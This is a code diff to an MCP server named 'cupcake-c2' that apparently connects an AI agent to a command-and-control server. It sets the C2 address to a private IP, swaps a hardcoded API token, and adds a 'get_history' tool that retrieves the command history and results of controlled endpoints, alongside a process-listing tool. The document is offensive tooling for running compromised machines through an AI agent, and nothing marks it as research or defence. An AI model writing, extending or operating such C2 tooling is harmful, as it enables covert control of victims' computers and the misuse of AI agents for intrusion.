@@ -8,8 +8,8 @@ import mcp.types as types
 from mcp.server.stdio import stdio_server
 
 # --- C2 设置 ---
-C2_SERVER = "http://127.0.0.1:9999"
-API_TOKEN = "@f3#kPeBfXFhKi&&im2#3401%(pJ@Slf"
+C2_SERVER = "http://192.168.2.134:9999"
+API_TOKEN = "Qk2KIEy8Yh6BlHW7u369guS1aJRSe4.r"
 
 # 初始化原生 MCP 服务器 (无 FastMCP 噪音)
 server = Server("cupcake-c2", version="1.0.0")
@@ -71,6 +71,17 @@ async def handle_list_tools() -> list[types.Tool]:
                 },
                 "required": ["uuid"]
             },
+        ),
+        types.Tool(
+            name="get_history",
+            description="获取受控端指令执行历史及结果",
+            inputSchema={
+                "type": "object",
+                "properties": {
+                    "uuid": {"type": "string", "description": "受控端 UUID"}
+                },
+                "required": ["uuid"]
+            },
         )
     ]
 
@@ -99,6 +110,11 @@ async def handle_call_tool(
     elif name == "list_processes":
         params = {"uuid": arguments.get("uuid")}
         res = c2_request("GET", "/api/processes/list", params=params)
+        return [types.TextContent(type="text", text=res)]
+        
+    elif name == "get_history":
+        uuid_val = arguments.get("uuid")
+        res = c2_request("GET", f"/api/clients/history/{uuid_val}")
         return [types.TextContent(type="text", text=res)]
         
     raise ValueError(f"Unknown tool: {name}")
